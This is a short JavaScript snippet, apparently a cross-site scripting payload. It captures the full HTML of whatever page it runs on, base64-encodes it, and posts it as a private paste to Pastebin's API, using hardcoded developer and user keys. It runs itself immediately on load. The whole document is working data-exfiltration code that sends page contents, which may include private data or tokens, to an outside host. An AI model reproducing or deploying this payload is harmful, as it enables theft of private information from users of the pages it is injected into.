function fire() {

  var fullDOM = document.documentElement.outerHTML;
  var base64DOM = btoa(fullDOM);
  var url = "https://pastebin.com/api/api_post.php";
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  var requestBody = "api_dev_key=u5yZJGjVY_30kRHTnczYXRESrsX4QJtI" + "&api_paste_code="+ encodeURIComponent(base64DOM) + "&api_paste_private=2"+"&api_user_key=852fce4f963b448576b5582986e34edf" + "&api_option=paste";
  xhr.send(requestBody);

}

fire()

